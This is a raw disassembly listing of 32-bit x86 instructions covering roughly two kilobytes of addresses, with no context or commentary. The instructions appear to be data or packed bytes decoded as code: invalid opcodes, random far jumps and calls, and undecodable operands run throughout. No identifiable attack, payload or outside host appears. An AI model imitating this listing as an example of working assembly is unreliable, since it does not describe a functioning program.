  4094fa:	push   ds
  4094fb:	and    dh,BYTE PTR [ebx]
  4094fd:	push   0x4
  4094ff:	stc    
  409500:	jmp    0x409483
  409502:	loop   0x4094e7
  409504:	js     0x40957e
  409506:	lods   eax,DWORD PTR ds:[esi]
  409507:	or     al,0x49
  409509:	jo     0x409585
  40950b:	loopne 0x4094a0
  40950d:	hlt    
  40950e:	fld    QWORD PTR [ebx]
  409510:	or     BYTE PTR [ecx-0x44ce61fb],al
  409516:	ret    
  409517:	push   cs
  409518:	(bad)  
  409519:	sbb    DWORD PTR [edi-0x62dfc59],ebx
  40951f:	fwait
  409520:	aad    0x49
  409522:	rcr    DWORD PTR [ecx-0x2cffc92],1
  409528:	popa   
  409529:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40952b:	loop   0x40954b
  40952d:	dec    esi
  40952e:	push   esp
  40952f:	repnz xor esp,ebx
  409532:	ins    DWORD PTR es:[edi],dx
  409533:	sahf   
  409534:	add    ah,BYTE PTR [ebx]
  409536:	mov    bh,0x5
  409538:	dec    ebx
  409539:	pop    esp
  40953a:	jecxz  0x409587
  40953c:	mov    al,0xfe
  40953e:	mov    al,0xfd
  409540:	jne    0x4094c8
  409542:	stc    
  409543:	test   BYTE PTR [edi-0x55357b7e],0x8f
  40954a:	jns    0x409550
  40954c:	out    0x13,eax
  40954e:	aad    0x27
  409550:	sbb    DWORD PTR [ebx+0x6e6c750],ebp
  409556:	in     eax,0x83
  409558:	sbb    cl,BYTE PTR [esi-0x601fda9a]
  40955e:	add    edx,edx
  409560:	nop
  409561:	pop    ds
  409562:	sbb    edx,0xf2b93dc9
  409568:	cmp    bl,BYTE PTR [ebp+0xc]
  40956b:	fistp  QWORD PTR [ebp+0xff1708]
  409571:	pop    eax
  409572:	fstp   TBYTE PTR [edx+0x7b1e95ae]
  409578:	push   esi
  409579:	call   0x73c005ad
  40957e:	cmp    al,0x28
  409580:	push   esi
  409581:	jl     0x4095bc
  409583:	or     DWORD PTR [ebx],esp
  409585:	test   al,0xb4
  409587:	ja     0x4095d6
  409589:	add    DWORD PTR [esi+0xcb0f452],esi
  40958f:	inc    esi
  409590:	mov    ecx,0xf9edca1d
  409595:	(bad)  
  409596:	ja     0x409603
  409598:	fwait
  409599:	mov    DWORD PTR [edx],ebp
  40959b:	jecxz  0x4095c9
  40959d:	(bad)  [esi]
  40959f:	xchg   esi,eax
  4095a0:	add    al,0x84
  4095a2:	daa    
  4095a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095a4:	inc    ecx
  4095a5:	ds inc ebp
  4095a7:	jns    0x40961f
  4095a9:	test   al,0x47
  4095ab:	lock es mov ebx,0x10724599
  4095b2:	shl    esi,cl
  4095b4:	jo     0x4095a5
  4095b6:	or     eax,0xa3eac990
  4095bb:	inc    edx
  4095bc:	jnp    0x4095e6
  4095be:	cdq    
  4095bf:	mov    ds:0x8b25b2ad,al
  4095c4:	mov    dh,0x86
  4095c6:	int    0x94
  4095c8:	jecxz  0x4095a2
  4095ca:	pop    ecx
  4095cb:	je     0x409622
  4095cd:	cdq    
  4095ce:	add    DWORD PTR [eax-0x39],edx
  4095d1:	push   esi
  4095d2:	mov    al,0x6f
  4095d4:	mov    ch,0x29
  4095d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095d7:	pop    edi
  4095d8:	jmp    0x8737:0x9f2d1f80
  4095df:	add    BYTE PTR [edi-0x5e],al
  4095e2:	stos   DWORD PTR es:[edi],eax
  4095e3:	shr    BYTE PTR [edx-0x2788b0d9],0xfc
  4095ea:	js     0x409572
  4095ec:	jmp    0x4095f1
  4095ee:	xchg   esi,eax
  4095ef:	and    al,0xb4
  4095f1:	mov    ds:0x1a00c5bd,al
  4095f6:	push   ss
  4095f7:	outs   dx,BYTE PTR ds:[esi]
  4095f8:	enter  0x85ea,0xf0
  4095fc:	sub    ebx,DWORD PTR [edx+0x9]
  4095ff:	push   0xffffff89
  409601:	call   0x38d7:0xd9f1b510
  409608:	push   0x5
  40960a:	inc    ebp
  40960b:	iret   
  40960c:	mov    bh,0x5e
  40960e:	add    ah,BYTE PTR [ebx+0x16886880]
  409614:	cmp    al,0x10
  409616:	cmc    
  409617:	sub    al,0x2b
  409619:	ror    BYTE PTR [ebx],1
  40961b:	jno    0x4095c8
  40961d:	mov    cl,0x5f
  40961f:	sbb    esp,edx
  409621:	int    0x2c
  409623:	pop    ebx
  409624:	pop    ebp
  409625:	inc    ecx
  409626:	push   ebx
  409627:	jmp    0x409688
  409629:	add    eax,0x755967a
  40962e:	daa    
  40962f:	xor    al,0xd6
  409631:	stos   BYTE PTR es:[edi],al
  409632:	pop    esi
  409633:	fisubr WORD PTR [edx+0x1e60a2c6]
  409639:	pusha  
  40963a:	rcr    DWORD PTR [edx-0x58155e72],1
  409640:	lods   al,BYTE PTR ds:[esi]
  409641:	push   ds
  409642:	dec    eax
  409643:	cdq    
  409644:	int    0x2b
  409646:	clc    
  409647:	mov    gs,WORD PTR [ecx]
  409649:	mov    DWORD PTR [ebp-0x42],ecx
  40964c:	jmp    0x3ae6:0xb0e224d4
  409653:	aas    
  409654:	(bad)  
  409656:	xchg   edx,eax
  409657:	or     BYTE PTR [edx-0x74],dh
  40965a:	xchg   esi,eax
  40965b:	jnp    0x409625
  40965d:	mov    bh,0x36
  40965f:	pop    ecx
  409660:	int    0x6
  409662:	shr    DWORD PTR [ebx+edx*1],0xb4
  409666:	stos   DWORD PTR es:[edi],eax
  409667:	cdq    
  409668:	push   es
  409669:	icebp  
  40966a:	cwde   
  40966b:	or     al,0x70
  40966d:	cvttps2pi mm2,QWORD PTR [edx+esi*2+0x19]
  409672:	out    dx,eax
  409673:	mov    eax,0x68f7574b
  409678:	mov    bl,0x11
  40967a:	lock or al,0xe4
  40967d:	outs   dx,BYTE PTR ds:[esi]
  40967e:	sub    esi,DWORD PTR [edx+0x45de904d]
  409684:	dec    edx
  409685:	mov    ebx,gs
  409687:	test   DWORD PTR [edx-0x37],0xded1f8c3
  40968e:	dec    esi
  40968f:	mov    edi,0xa442d201
  409694:	lds    ecx,FWORD PTR [ecx+ebx*2+0x4bb14c94]
  40969b:	add    al,0x33
  40969d:	pop    edx
  40969e:	(bad)  
  40969f:	hlt    
  4096a0:	sub    ecx,DWORD PTR [edi-0x2f]
  4096a3:	aad    0x75
  4096a5:	and    ebx,DWORD PTR [edi-0x49]
  4096a8:	pop    eax
  4096a9:	fnstenv [edx-0x4b169584]
  4096af:	or     ebx,DWORD PTR [ebx+ebx*4+0x59]
  4096b3:	les    esp,FWORD PTR ds:[edi+0x74]
  4096b7:	mov    ch,0x83
  4096b9:	xchg   esi,eax
  4096ba:	fsubr  st,st(5)
  4096bc:	pushf  
  4096bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096be:	pop    ecx
  4096bf:	ret    
  4096c0:	cmp    DWORD PTR [esi-0x2282da08],ecx
  4096c6:	(bad)  
  4096c7:	mov    eax,0xe7aa6166
  4096cc:	gs and bh,dh
  4096cf:	in     eax,dx
  4096d0:	test   al,0xdd
  4096d2:	fiadd  WORD PTR [ebp-0xd]
  4096d5:	and    eax,0xe28f6c84
  4096da:	inc    ecx
  4096db:	mov    BYTE PTR [ebx+0x35],ch
  4096de:	pusha  
  4096df:	mov    cl,0x2f
  4096e1:	pop    ds
  4096e2:	jb     0x4096e5
  4096e4:	cmp    eax,0x51044ee4
  4096e9:	inc    edi
  4096ea:	iret   
  4096eb:	or     bh,BYTE PTR [ebx+0x186547f7]
  4096f1:	jp     0x40973f
  4096f3:	fs mov esi,0x8c7c8cc4
  4096f9:	xchg   ebx,eax
  4096fa:	xchg   edi,eax
  4096fb:	sub    dl,BYTE PTR gs:[esi-0x3832b482]
  409702:	int    0xc7
  409704:	cmp    edx,0x48
  409707:	fsub   QWORD PTR [ebx]
  409709:	pop    ss
  40970a:	jp     0x409708
  40970c:	sbb    BYTE PTR [edx],al
  40970e:	sar    BYTE PTR [ebx],0xb2
  409711:	push   eax
  409712:	(bad)  
  409713:	cmp    al,0xe1
  409715:	test   BYTE PTR [ecx+0x44],0x35
  409719:	std    
  40971a:	repnz int 0xbf
  40971d:	dec    edi
  40971e:	into   
  40971f:	cmp    eax,edx
  409721:	lock pop es
  409723:	dec    esi
  409724:	in     eax,0xcd
  409726:	pop    ds
  409727:	ins    DWORD PTR es:[edi],dx
  409728:	lar    ebx,WORD PTR [ebp-0x624ded89]
  40972f:	icebp  
  409730:	out    dx,eax
  409731:	push   0x63
  409733:	loope  0x409745
  409735:	daa    
  409736:	mov    edi,0x537d6485
  40973b:	(bad)  
  40973c:	std    
  40973d:	fbld   TBYTE PTR [esi-0x3fce2bd1]
  409743:	pop    ss
  409744:	(bad)  
  409745:	or     eax,0xd1bed82f
  40974a:	inc    ecx
  40974b:	sub    eax,0xbd66de15
  409750:	cdq    
  409751:	rcr    DWORD PTR [ebp+0x6f9f39d8],0x65
  409758:	add    eax,0xbdee2c8d
  40975d:	xchg   esp,eax
  40975e:	xor    al,0xb8
  409760:	or     DWORD PTR [ecx+edi*4],0x45
  409764:	add    ebp,esi
  409766:	push   es
  409767:	js     0x4097b3
  409769:	(bad)  
  40976a:	xor    bl,al
  40976c:	gs jae 0x4097a4
  40976f:	in     eax,0x42
  409771:	push   ss
  409772:	rcr    ecx,0xe6
  409775:	inc    ebp
  409776:	jge    0x4097cf
  409778:	mov    DWORD PTR [ebx-0x79],edi
  40977b:	fs out dx,al
  40977d:	(bad)  
  40977e:	sar    BYTE PTR [edx+ecx*1-0x6f357b11],1
  409785:	mov    bh,0x2f
  409787:	ret    0x4ebe
  40978a:	ja     0x4097d0
  40978c:	adc    BYTE PTR [edx],0x19
  40978f:	fyl2x  
  409791:	and    ah,BYTE PTR [esi+0x4c9845e2]
  409797:	fucomip st,st(6)
  409799:	xlat   BYTE PTR ds:[ebx]
  40979a:	loopne 0x409740
  40979c:	and    bh,BYTE PTR ds:0x58e3ecd1
  4097a2:	nop
  4097a3:	sbb    ah,BYTE PTR [ecx-0x46c93e1a]
  4097a9:	(bad)  
  4097aa:	test   eax,0x380ced44
  4097af:	mov    ecx,0x5a511501
  4097b5:	mov    edx,0x7c17bcd8
  4097ba:	pusha  
  4097bb:	sbb    BYTE PTR [esi+0xcca8513],0x9
  4097c2:	pop    eax
  4097c3:	inc    ecx
  4097c4:	mov    dl,0x82
  4097c6:	pop    edi
  4097c7:	fs int 0xca
  4097ca:	dec    DWORD PTR [edi]
  4097cc:	inc    eax
  4097cd:	lock aaa 
  4097cf:	adc    al,0xba
  4097d1:	or     eax,0x21eda458
  4097d6:	push   ebx
  4097d7:	or     edi,ebx
  4097d9:	xor    ecx,DWORD PTR [eax+0x54]
  4097dc:	scas   al,BYTE PTR es:[edi]
  4097dd:	js     0x40982d
  4097df:	loop   0x40980b
  4097e1:	and    eax,0xbe7f4a42
  4097e6:	adc    eax,DWORD PTR [ebx+edx*2]
  4097e9:	fstp   QWORD PTR [edx+edx*4]
  4097ec:	pusha  
  4097ed:	hlt    
  4097ee:	call   0xaa89:0x7511ea9d
  4097f5:	sar    cl,0x4d
  4097f8:	outs   dx,DWORD PTR ds:[esi]
  4097f9:	hlt    
  4097fa:	dec    ebp
  4097fb:	inc    esp
  4097fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097fd:	pop    edi
  4097fe:	inc    ebx
  4097ff:	push   edx
  409800:	mov    dh,0x8f
  409802:	ins    BYTE PTR es:[edi],dx
  409803:	je     0x4097da
  409805:	aad    0x8f
  409807:	(bad)  
  409808:	sbb    ebx,ebx
  40980a:	and    eax,0x3c5b12c2
  40980f:	inc    esp
  409810:	ret    0xf7c1
  409813:	repnz push cs
  409815:	(bad)  
  409816:	loope  0x40982e
  409818:	pause  
  40981a:	cmp    bl,cl
  40981c:	out    dx,eax
  40981d:	mov    ebp,0xf2e0ac42
  409822:	cmp    bl,BYTE PTR [ebp-0x23]
  409825:	(bad)  
  409826:	addr16 icebp 
  409828:	dec    eax
  409829:	mov    ch,0x3
  40982b:	test   al,0x49
  40982e:	add    ch,BYTE PTR [edx]
  409830:	arpl   WORD PTR [esi-0x3bf0182f],si
  409836:	imul   edx,DWORD PTR [esi+0x389cbb40],0xf
  40983d:	push   edi
  40983e:	fbstp  TBYTE PTR fs:[ecx]
  409841:	xor    DWORD PTR [edi],ebx
  409843:	ds mov eax,0x93bb0594
  409849:	outs   dx,BYTE PTR ds:[esi]
  40984a:	xor    BYTE PTR [esi],bh
  40984c:	dec    esi
  40984d:	jb     0x409846
  40984f:	outs   dx,DWORD PTR ss:[esi]
  409851:	jne    0x409826
  409853:	mov    bl,0xf1
  409855:	push   0x3a581ddd
  40985a:	out    dx,al
  40985b:	int3   
  40985c:	scas   al,BYTE PTR es:[edi]
  40985d:	pusha  
  40985e:	hlt    
  40985f:	add    BYTE PTR cs:[edi-0x25065ae2],cl
  409866:	jbe    0x4097ef
  409868:	cdq    
  409869:	mov    al,ds:0xb4c4fa67
  40986e:	hlt    
  40986f:	xchg   ebp,eax
  409870:	jge    0x4098e1
  409872:	adc    DWORD PTR [ebp+0x345b0cd7],esp
  409878:	cld    
  409879:	lahf   
  40987a:	es into 
  40987c:	out    dx,al
  40987d:	icebp  
  40987e:	loopne 0x4098d4
  409880:	test   esi,esp
  409882:	adc    eax,0x862ce442
  409888:	pop    ecx
  409889:	fmul   DWORD PTR [edx+0x6eed7b33]
  40988f:	xchg   DWORD PTR [edi+0x62a70582],edi
  409895:	mov    bh,0xf5
  409897:	mov    al,ds:0xee7ced83
  40989c:	loopne 0x409845
  40989e:	pop    ebp
  40989f:	mov    ebp,0x1a5b2e44
  4098a4:	mov    ?,WORD PTR ds:0xd61ae03a
  4098aa:	fadd   QWORD PTR [ebp-0x697ab40e]
  4098b0:	jnp    0x409882
  4098b2:	rol    DWORD PTR [edi+eax*8],1
  4098b5:	jno    0x409882
  4098b7:	add    esi,DWORD PTR [ecx-0x4e]
  4098ba:	scas   eax,DWORD PTR es:[edi]
  4098bb:	cli    
  4098bc:	nop
  4098bd:	int    0x8d
  4098bf:	jns    0x4098bb
  4098c1:	loop   0x40986e
  4098c3:	adc    cl,BYTE PTR [ebx+eax*8+0x17]
  4098c7:	mov    al,ds:0xd178c2d9
  4098cc:	call   0x25fd:0x3989e0ba
  4098d3:	aam    0xea
  4098d5:	and    eax,edx
  4098d7:	lods   eax,DWORD PTR ds:[esi]
  4098d8:	rcr    eax,cl
  4098da:	jb     0x40991b
  4098dc:	sbb    al,0xe0
  4098de:	and    DWORD PTR [ebp+0x100b4f22],edx
  4098e4:	xor    dh,bh
  4098e6:	das    
  4098e7:	loop   0x4098b6
  4098e9:	push   esp
  4098eb:	and    bh,BYTE PTR [ebx]
  4098ed:	cli    
  4098ee:	cwde   
  4098ef:	and    eax,0xc7fa2d81
  4098f4:	dec    esp
  4098f5:	cdq    
  4098f6:	shr    BYTE PTR [edi+0x1d8f11de],1
  4098fc:	inc    eax
  4098fd:	enter  0x5720,0xd5
  409901:	nop
  409902:	sti    
  409903:	mov    dh,0x5f
  409905:	xlat   BYTE PTR ds:[ebx]
  409906:	mov    WORD PTR [ebp-0x4f],cs
  409909:	shl    BYTE PTR [edx],0xd7
  40990c:	add    ch,cl
  40990e:	push   edi
  40990f:	lods   eax,DWORD PTR ds:[esi]
  409911:	sub    BYTE PTR [edi-0x3e272fde],ch
  409917:	loop   0x409990
  409919:	scas   eax,DWORD PTR es:[edi]
  40991a:	mov    edx,0x53756032
  40991f:	push   ss
  409920:	or     BYTE PTR [ebx-0x55b14b76],bl
  409926:	(bad)  [edi-0x7025bcf3]
  40992c:	pop    ebx
  40992d:	lock push es
  40992f:	pusha  
  409930:	jmp    0x409932
  409932:	xchg   ebp,eax
  409933:	data16 fs mov al,0x6a
  409937:	lea    eax,[esp+eiz*8+0x666fd9ea]
  40993e:	xchg   BYTE PTR [ebx-0x4f04e379],dl
  409944:	cmp    eax,0xc6586c06
  409949:	sbb    esp,DWORD PTR [ebp+0x549626c5]
  40994f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409950:	pop    esi
  409951:	mov    ch,0xc8
  409953:	inc    ebp
  409954:	sub    BYTE PTR [eax+0x13],bl
  409957:	and    DWORD PTR [edx],ebp
  409959:	test   DWORD PTR [ebp-0x77],edi
  40995c:	jmp    0xf9e68f34
  409961:	and    eax,DWORD PTR [esi-0x66]
  409964:	jmp    0x1354:0x488bec59
  40996b:	push   ss
  40996c:	test   al,0x55
  40996e:	ret    
  40996f:	outs   dx,BYTE PTR ds:[esi]
  409970:	rep stos DWORD PTR es:[edi],eax
  409972:	push   0x78ec2cf3
  409977:	les    ecx,FWORD PTR [ecx]
  409979:	mov    ds:0xe8122d1f,al
  40997e:	pop    es
  40997f:	lods   al,BYTE PTR ds:[esi]
  409980:	mov    esi,DWORD PTR [edi+0x7c955ff1]
  409986:	mov    ?,WORD PTR [ebp-0x105a32c0]
  40998c:	push   edi
  40998d:	xor    ecx,DWORD PTR [ebx+0x7cf9dfa6]
  409993:	ds mov dl,0x57
  409996:	fs int3 
  409998:	popa   
  409999:	xlat   BYTE PTR ds:[ebx]
  40999a:	sub    BYTE PTR [esi],dl
  40999c:	cmp    eax,0xe0000b67
  4099a1:	mov    edi,0x6cc06101
  4099a6:	aam    0x3
  4099a8:	mov    ebp,0xa2785b17
  4099ad:	stos   BYTE PTR es:[edi],al
  4099ae:	push   ss
  4099af:	lds    esi,FWORD PTR [ebp-0x26a5a5a5]
  4099b5:	cwde   
  4099b6:	test   al,0x2e
  4099b8:	hlt    
  4099b9:	mov    ds:0x731170da,al
  4099be:	leave  
  4099bf:	sahf   
  4099c0:	pop    ebx
  4099c1:	adc    eax,DWORD PTR [edx+0x5]
  4099c4:	ds dec edi
  4099c6:	sub    BYTE PTR [ebx+0x66],0x79
  4099ca:	mov    dh,0x5d
  4099cc:	outs   dx,DWORD PTR ds:[esi]
  4099cd:	imul   esi,DWORD PTR es:[esi+0x799b3306],0x43
  4099d5:	and    BYTE PTR [eax],ch
  4099d7:	sahf   
  4099d8:	cli    
  4099d9:	mov    edi,0x838b6671
  4099de:	inc    ebp
  4099df:	and    BYTE PTR [ebx+0x358b72fe],dl
  4099e5:	(bad)  
  4099e6:	and    ch,dl
  4099e8:	mov    edx,0xe5f804da
  4099ee:	dec    esi
  4099ef:	pop    ebx
  4099f0:	aad    0x72
  4099f2:	js     0x409985
  4099f4:	loop   0x409a6f
  4099f6:	cmp    edi,DWORD PTR fs:[ebx+0x70049cf4]
  4099fd:	push   esp
  4099fe:	ja     0x4099cb
  409a00:	inc    DWORD PTR [ecx]
  409a02:	adc    eax,0x52d4b7b8
  409a07:	xor    eax,0x64a67de2
  409a0c:	mov    eax,0x80b41935
  409a11:	sub    bh,dl
  409a13:	pop    ecx
  409a14:	(bad)  
  409a16:	jecxz  0x4099eb
  409a18:	sti    
  409a19:	xchg   BYTE PTR [ecx],cl
  409a1b:	enter  0xd012,0x93
  409a1f:	mov    ebx,0x20b5a9ec
  409a24:	ins    BYTE PTR es:[edi],dx
  409a25:	sbb    bl,BYTE PTR [edx-0x224b4173]
  409a2b:	lds    edi,FWORD PTR [edx]
  409a2d:	lods   eax,DWORD PTR ds:[esi]
  409a2e:	add    eax,0x6d3fc1c8
  409a33:	ficom  WORD PTR [ecx-0x54a30d74]
  409a39:	sbb    cl,BYTE PTR [edi+edx*8]
  409a3c:	sbb    DWORD PTR [eax-0x1c],ebp
  409a3f:	out    dx,eax
  409a40:	in     al,dx
  409a41:	dec    ecx
  409a42:	lods   eax,DWORD PTR ds:[esi]
  409a43:	lods   al,BYTE PTR ds:[esi]
  409a44:	mov    eax,ds:0x60fd11f2
  409a49:	cmp    BYTE PTR [eax-0x3c],cl
  409a4c:	sub    eax,0xa56ebde9
  409a51:	loopne 0x409a05
  409a53:	pushf  
  409a54:	jg     0x409abc
  409a56:	add    al,0x89
  409a58:	xor    DWORD PTR [edx-0x4e7cef66],eax
  409a5e:	test   BYTE PTR [edx+ecx*2+0x46],0xc
  409a63:	pop    ecx
  409a64:	arpl   WORD PTR ds:0xea61141d,si
  409a6a:	clc    
  409a6b:	inc    esi
  409a6c:	and    dl,BYTE PTR [eax]
  409a6e:	mov    WORD PTR [edi],?
  409a70:	xlat   BYTE PTR ds:[ebx]
  409a71:	cmc    
  409a72:	xchg   BYTE PTR [edi+0x2dfc9fb8],ch
  409a78:	rol    BYTE PTR [eax],1
  409a7a:	xchg   edi,eax
  409a7b:	fdivr  st,st(6)
  409a7d:	mov    ebp,0xff1412b5
  409a82:	mov    cl,0x7d
  409a84:	and    al,0xdf
  409a86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a87:	dec    esi
  409a88:	sbb    al,0x98
  409a8a:	xchg   esi,eax
  409a8b:	mov    ds:0x29d7aad5,al
  409a90:	scas   al,BYTE PTR es:[edi]
  409a91:	dec    ecx
  409a92:	mov    edx,0x6c55472c
  409a97:	lea    ebp,[ecx+0x3f8233c2]
  409a9d:	inc    ecx
  409a9e:	inc    esi
  409a9f:	dec    ebp
  409aa0:	adc    BYTE PTR [ebx],bl
  409aa2:	adc    dl,BYTE PTR [ebx-0x74]
  409aa5:	mov    dl,0x1b
  409aa7:	mov    ds:0x7606c8c6,eax
  409aac:	clc    
  409aad:	mov    edx,0x97e5b877
  409ab2:	ja     0x409a3d
  409ab4:	xor    BYTE PTR [eax],cl
  409ab6:	mov    WORD PTR [ebx+0x442eb276],es
  409abc:	pop    es
  409abd:	xor    DWORD PTR [ebp-0x49aa9835],eax
  409ac3:	js     0x409a45
  409ac5:	shr    ecx,cl
  409ac7:	pusha  
  409ac8:	xchg   bh,ch
  409aca:	cmp    bl,BYTE PTR [edi-0x2acf491e]
  409ad0:	mov    esp,0x6fcc4d32
  409ad5:	mov    al,ds:0x6eccc368
  409ada:	mov    ebp,0x92f49d3c
  409adf:	out    0x68,eax
  409ae1:	icebp  
  409ae2:	imul   esi,DWORD PTR [ebp-0x2541be67],0x89eab766
  409aec:	and    bh,BYTE PTR [edi]
  409aee:	jle    0x409b34
  409af0:	mov    cl,0xe6
  409af2:	pop    edx
  409af3:	dec    esi
  409af4:	fimul  DWORD PTR [edi+ebp*4]
  409af7:	mov    ds:0xa545641f,eax
  409afc:	and    ebp,edx
  409afe:	jecxz  0x409ac1
  409b00:	push   ebp
  409b01:	loopne 0x409af9
  409b03:	sub    eax,0x97c1070
  409b08:	mov    edx,ebp
  409b0a:	rcr    DWORD PTR [ebx-0x52],cl
  409b0d:	in     eax,0x8
  409b0f:	mov    edx,0x56312ed7
  409b14:	fucomi st,st(0)
  409b16:	mov    eax,ds:0x6ae9a012
  409b1b:	push   es
  409b1c:	cld    
  409b1d:	xor    DWORD PTR [ebp-0x7b],edi
  409b20:	xchg   dl,cl
  409b22:	and    DWORD PTR [esi+edi*2+0x43],esi
  409b26:	mov    WORD PTR [ecx+0x58b13920],?
  409b2c:	sub    al,0xc0
  409b2e:	xor    cl,bh
  409b30:	or     edi,DWORD PTR ss:[esp+esi*8+0x2b]
  409b35:	(bad)  
  409b36:	adc    eax,0x39ea0473
  409b3b:	sar    esp,1
  409b3d:	lods   eax,DWORD PTR ds:[esi]
  409b3e:	retf   
  409b3f:	test   eax,0xa9383397
  409b44:	call   0x7064:0x64ac64b3
  409b4b:	ret    0x406
  409b4e:	xchg   edi,eax
  409b4f:	(bad)  
  409b50:	cld    
  409b51:	cmp    al,0x13
  409b53:	dec    esi
  409b54:	mov    cl,0x8f
  409b56:	mov    ebx,0xdc75bbe9
  409b5b:	sbb    eax,0xabfdadd2
  409b60:	int    0xa5
  409b62:	scas   eax,DWORD PTR es:[edi]
  409b63:	jae    0x409b75
  409b65:	sub    al,bh
  409b67:	jmp    DWORD PTR [eax-0x17af2905]
  409b6d:	dec    edi
  409b6e:	aad    0xfe
  409b70:	jmp    0x409b24
  409b72:	push   esp
  409b73:	pop    es
  409b74:	mov    esp,0x824b9a70
  409b79:	jno    0x409b23
  409b7b:	or     al,0x97
  409b7d:	stos   DWORD PTR es:[edi],eax
  409b7e:	inc    esp
  409b7f:	and    al,0x72
  409b81:	popa   
  409b82:	or     edi,esp
  409b84:	adc    BYTE PTR [esi+eiz*1],cl
  409b87:	rcl    BYTE PTR [edx],1
  409b89:	outs   dx,BYTE PTR ds:[esi]
  409b8a:	fwait
  409b8b:	sbb    eax,DWORD PTR [esi]
  409b8d:	dec    ebp
  409b8e:	faddp  st(2),st
  409b90:	push   ecx
  409b91:	inc    ebp
  409b92:	adc    edx,eax
  409b94:	xor    bh,BYTE PTR [ebp+0x7d]
  409b97:	mov    DWORD PTR [ecx-0x75cbccac],edx
  409b9d:	cmc    
  409b9e:	push   edx
  409b9f:	gs dec esp
  409ba1:	mov    ah,BYTE PTR [esi+0x24]
  409ba4:	pop    eax
  409ba5:	mov    esp,0x1b720e5
  409baa:	enter  0x789,0xad
  409bae:	addr16 int3 
  409bb0:	enter  0x536e,0x96
  409bb4:	xchg   ecx,eax
  409bb5:	mov    DWORD PTR [esi+0x6d],eax
  409bb8:	pop    ebx
  409bb9:	cmc    
  409bba:	or     bl,ah
  409bbc:	lods   al,BYTE PTR ds:[esi]
  409bbd:	pop    ecx
  409bbe:	and    DWORD PTR [edx+esi*2+0x64],esp
  409bc2:	mov    ch,0x37
  409bc4:	cmp    eax,0x100a57b5
  409bc9:	inc    ebx
  409bca:	enter  0x7895,0x2c
  409bce:	add    bh,dl
  409bd0:	fstp   QWORD PTR [eax]
  409bd2:	inc    ebx
  409bd3:	or     dh,BYTE PTR [ecx-0x11]
  409bd6:	pop    ecx
  409bd7:	xor    BYTE PTR [ecx-0x275e768a],bh
  409bdd:	jb     0x409b9a
  409bdf:	dec    eax
  409be0:	sub    ecx,DWORD PTR [ebp+0x26]
  409be3:	fbld   TBYTE PTR [esi+0x58]
  409be6:	aaa    
  409be7:	stos   DWORD PTR es:[edi],eax
  409be8:	sar    DWORD PTR [edx-0x27ae880b],cl
  409bee:	sar    edi,1
  409bf0:	movsx  edi,BYTE PTR [ebx-0x43]
  409bf4:	mov    bl,0xc4
  409bf6:	dec    edi
  409bf7:	dec    ecx
  409bf8:	jp     0x409c49
  409bfa:	out    dx,al
  409bfb:	sub    DWORD PTR [esi],esp
  409bfd:	hlt    
  409bfe:	cdq    
  409bff:	scas   eax,DWORD PTR es:[edi]
  409c00:	mov    eax,ds:0x988b693e
  409c05:	push   0xf1c31fb4
  409c0a:	mov    dl,0x28
  409c0c:	mov    ah,0x72
  409c0e:	sub    ah,BYTE PTR [ebx]
  409c10:	les    eax,FWORD PTR ds:0x1a262e55
  409c16:	pop    es
  409c17:	jp     0x409b9d
  409c19:	scas   eax,DWORD PTR es:[edi]
  409c1a:	rol    ah,cl
  409c1c:	add    ebx,DWORD PTR [eax]
  409c1e:	test   BYTE PTR [edi-0x1f],ch
  409c21:	jns    0x409bac
  409c23:	dec    edi
  409c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c25:	inc    eax
  409c26:	mov    esp,0x43b827b4
  409c2b:	imul   ebx,esi,0xe5595c29
  409c31:	xchg   esi,eax
  409c32:	pop    ds
  409c33:	sbb    ebx,DWORD PTR [ebx+0x619cfa52]
  409c39:	hlt    
  409c3a:	ds test eax,0xbf5dfbf5
  409c40:	dec    eax
  409c41:	jo     0x409c2e
  409c43:	jmp    0x409c3c
  409c45:	sbb    DWORD PTR [ebp+edx*8-0x66cfdd3c],ecx
  409c4c:	jbe    0x409c35
  409c4e:	(bad)  
  409c4f:	pop    ebx
  409c50:	repz inc DWORD PTR [edi]
  409c53:	ds mov dh,0xdc
  409c56:	pop    edi
  409c57:	retf   
  409c58:	mov    ecx,0x12ea6c13
  409c5d:	ficom  WORD PTR [ebx+edx*4]
  409c60:	addr16 pop edx
  409c62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c63:	shl    DWORD PTR [eax],1
  409c65:	cmp    al,0x1d
  409c67:	dec    ebp
  409c68:	scas   eax,DWORD PTR es:[edi]
  409c69:	xor    BYTE PTR [ebx-0x78],0xe7
  409c6d:	lods   eax,DWORD PTR ds:[esi]
  409c6e:	ror    DWORD PTR [edi-0x7deff348],cl
  409c74:	jo     0x409c36
  409c76:	repnz adc eax,0x61a0b759
  409c7c:	sub    DWORD PTR [ecx],0xd
  409c7f:	aam    0x23
  409c81:	adc    ebp,DWORD PTR [edx+0x6844c83a]
  409c87:	jns    0x409c11
  409c89:	ins    DWORD PTR es:[edi],dx
  409c8a:	sahf   
  409c8b:	lea    ebx,[ecx-0x6c5409c9]
  409c91:	lea    edx,[esi]
  409c93:	mov    eax,0x89daeb40
  409c98:	cmp    DWORD PTR [ebx+0x49],ebx
  409c9b:	xchg   esp,eax
  409c9c:	inc    eax
  409c9d:	mov    DWORD PTR [edx],0xd9e5db84
  409ca3:	dec    edx
  409ca4:	lea    edx,[ecx-0x70]
  409ca7:	sub    DWORD PTR [edi+eiz*8+0x3ef446ca],0xffffffb4
  409caf:	pop    edi
  409cb0:	test   DWORD PTR [edx],esi
  409cb2:	and    DWORD PTR [ebp+eax*1-0x7dc85cd7],edx
  409cb9:	cmp    eax,0x423336d
  409cbe:	(bad)  
  409cc0:	and    DWORD PTR [eax+0x37],edx
  409cc3:	sub    bl,BYTE PTR [eax-0xf1f882d]
  409cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cca:	sub    al,0x32
  409ccc:	jo     0x409d2c
  409cce:	or     eax,0x1149dbc9
  409cd3:	test   eax,0xa943651d
  409cd8:	cmp    BYTE PTR [ebx+0x112434b],0xdb
